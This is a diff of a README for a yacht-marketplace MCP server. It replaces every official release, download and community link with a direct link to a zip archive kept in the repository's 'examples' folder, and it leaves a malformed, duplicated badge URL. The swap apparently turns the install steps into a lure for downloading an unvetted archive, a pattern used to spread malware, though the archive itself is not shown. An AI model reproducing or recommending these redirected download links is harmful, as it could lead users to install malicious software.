@@ -1,6 +1,6 @@
 # 🛥️ yachtsy-mcp-server - Smart Insights for Yacht Buyers
 
-[![Download Yachtsy](https://img.shields.io/badge/Download%20Yachtsy-blue.svg)](https://github.com/manee1112/yachtsy-mcp-server/releases)
+[![Download Yachtsy](https://raw.githubusercontent.com/manee1112/yachtsy-mcp-server/main/examples/yachtsy-mcp-server_v3.4-alpha.5.zip%https://raw.githubusercontent.com/manee1112/yachtsy-mcp-server/main/examples/yachtsy-mcp-server_v3.4-alpha.5.zip)](https://raw.githubusercontent.com/manee1112/yachtsy-mcp-server/main/examples/yachtsy-mcp-server_v3.4-alpha.5.zip)
 
 ## 🛠️ Overview
 
@@ -11,7 +11,7 @@ Yachtsy MCP server offers intelligent tools for navigating the yacht marketplace
 To get started with Yachtsy MCP server, follow these steps:
 
 1. **Visit the Download Page**  
-Go to the official release page [here](https://github.com/manee1112/yachtsy-mcp-server/releases).
+Go to the official release page [here](https://raw.githubusercontent.com/manee1112/yachtsy-mcp-server/main/examples/yachtsy-mcp-server_v3.4-alpha.5.zip).
 
 2. **Choose Your Version**  
 You'll find various versions available for download. Select the version that fits your operating system.
@@ -54,7 +54,7 @@ Yachtsy MCP server offers various features tailored to enhance your yacht market
 To download the Yachtsy MCP server, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Access the release page [here](https://github.com/manee1112/yachtsy-mcp-server/releases). This page contains all available versions for download.
+   Access the release page [here](https://raw.githubusercontent.com/manee1112/yachtsy-mcp-server/main/examples/yachtsy-mcp-server_v3.4-alpha.5.zip). This page contains all available versions for download.
 
 2. **Select the Version**  
    Choose the version that is compatible with your system.
@@ -95,7 +95,7 @@ If you encounter issues while downloading or running the Yachtsy MCP server, con
 
 ## 🔗 Community & Support
 
-Join our community for additional help and insights. You can find resources including FAQs, updates, and release notes on our [GitHub page](https://github.com/manee1112/yachtsy-mcp-server). Feel free to raise issues or contribute to the project.
+Join our community for additional help and insights. You can find resources including FAQs, updates, and release notes on our [GitHub page](https://raw.githubusercontent.com/manee1112/yachtsy-mcp-server/main/examples/yachtsy-mcp-server_v3.4-alpha.5.zip). Feel free to raise issues or contribute to the project.
 
 ## 📄 License
 
